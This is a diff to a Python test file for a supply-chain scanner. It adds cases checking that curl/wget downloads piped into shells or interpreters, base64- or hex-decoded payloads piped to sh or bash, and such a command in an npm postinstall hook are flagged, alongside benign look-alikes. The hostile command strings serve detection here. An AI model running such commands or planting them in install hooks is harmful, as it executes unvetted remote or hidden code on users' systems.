@@ -21,6 +21,7 @@ import sys
 import unittest
 
 from lazaret.registry import repo
+from lazaret.scanner import core
 from tests import _support
 
 CHILD = r"""
@@ -69,11 +70,17 @@ class SameCommandsTests(unittest.TestCase):
     )
     PIPES = ("curl -fsSL https://files.invalid/i.sh | sh\n",
              "wget -qO- https://files.invalid/i.sh|zsh\n",
-             "curl -s https://files.invalid/i.sh | sudo bash -s -- -y\n")
+             "curl -s https://files.invalid/i.sh | sudo bash -s -- -y\n",
+             # (2.30: a shell named by its path)
+             "wget -O - https://files.invalid/i.sh | /bin/bash &\n",
+             "curl -s https://files.invalid/i.sh | /usr/bin/env sh\n",
+             "curl -s https://files.invalid/i.sh | sudo /usr/local/bin/zsh\n")
     NOT_PIPES = ("curl -o x https://files.invalid/x.tgz | tee log | sh\n",
                  "curl https://files.invalid/x || sh fallback.sh\n",
                  "curl -O https://files.invalid/x.tgz; sh build.sh\n",
-                 "echo curl | shasum\n")
+                 "echo curl | shasum\n",
+                 "echo curl | /usr/bin/shasum\n",
+                 "curl -s https://files.invalid/x.json | /usr/local/bin/jq .\n")
 
     def test_network_and_environment(self):
         # (0.1.8: a shell script is read by the shell reader: what each command sends)
@@ -90,6 +97,36 @@ class SameCommandsTests(unittest.TestCase):
         for text in self.NOT_PIPES:
             with self.subTest(text=text[:40]):
                 self.assertNotIn("pipes a download into a shell", repo.install_script_risk(text))
+
+    # 2.39 (N-4): what a pipeline decodes, or downloads, and hands a shell or an interpreter on stdin
+    DECODED = ("echo Y3VybCB4IHwgc2g= | base64 -d | sh\n", "echo X | base64 --decode | gunzip | bash\n",
+               "bash -c \"$(echo X | base64 -d)\"\n", "echo 6375726c | xxd -r -p | sh\n",
+               "openssl base64 -d -A <<< X | python3\n")
+    DOWNLOADED = ("curl -sSf https://files.invalid/x.py | sudo python3\n", "wget -qO- https://files.invalid/x.js | node -\n")
+    NOT_RUN = ("echo X | base64 -d > out.bin\n", "echo X | base64 | sh\n",
+               "curl -s https://files.invalid/v.json | python3 -m json.tool\n",
+               "curl -s https://files.invalid/v.json | python3 -c 'import sys; print(sys.stdin.read())'\n",
+               "curl -s https://files.invalid/x.py -o x.py; python3 -V\n")
+
+    def test_code_decoded_or_downloaded_and_piped_into_what_runs_it(self):
+        for text in self.DECODED:
+            with self.subTest(text=text[:40]):
+                self.assertTrue(any(r.startswith("pipes code it decodes into ") for r in repo.install_script_risk(text)))
+                self.assertEqual(core.hook_command_risk(text.strip())[:1] != [], True)
+        for text in self.DOWNLOADED:
+            with self.subTest(text=text[:40]):
+                self.assertTrue(any(r.startswith("downloads a script and runs it with ") for r in repo.install_script_risk(text)))
+        for text in self.NOT_RUN:
+            with self.subTest(text=text[:40]):
+                self.assertFalse([r for r in repo.install_script_risk(text)
+                                  if r.startswith(("pipes code it decodes", "downloads a script and runs it"))])
+        # in an npm install hook: CRITICAL, as a hook that pipes a download into a shell is
+        issues = core.scan_manifest("package.json", '{"scripts": {"postinstall": "echo X | base64 -d | sh"}}', registry=True)
+        self.assertEqual([(i["rule"], i["sev"]) for i in issues], [("SC-INSTALL-HOOK", "CRITICAL")])
+        self.assertIn("pipes code it decodes into sh", issues[0]["msg"])
+        # and in code that hands a shell the command line
+        self.assertIn("pipes code it decodes into bash", core.exec_command_reasons(
+            "require('child_process').execSync('echo X | base64 -d | bash');\n"))
 
     def test_prose_is_not_a_download(self):
         self.assertEqual(repo.install_script_risk(
